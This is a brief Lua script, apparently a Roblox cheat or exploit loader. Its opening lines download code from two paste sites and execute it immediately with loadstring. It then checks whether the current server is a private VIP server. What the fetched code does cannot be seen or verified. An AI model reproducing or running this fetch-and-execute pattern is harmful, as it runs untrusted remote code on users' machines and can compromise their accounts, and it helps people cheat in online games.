loadstring(game:HttpGet("https://cdn.sourceb.in/bins/phlcGAGBBG/0"))()
loadstring(game:HttpGet("https://pastefy.app/f05PAnbq/raw"))()
local Services = setmetatable({}, {
    __index = function(self, s)
        return game:GetService(s)
    end
})

local IsVipServer = false
pcall(function()
    local rs = Services.RobloxReplicatedStorage
    if rs and rs:FindFirstChild("GetServerType") then
        IsVipServer = rs.GetServerType:InvokeServer() == "VIPServer"
    end
end)
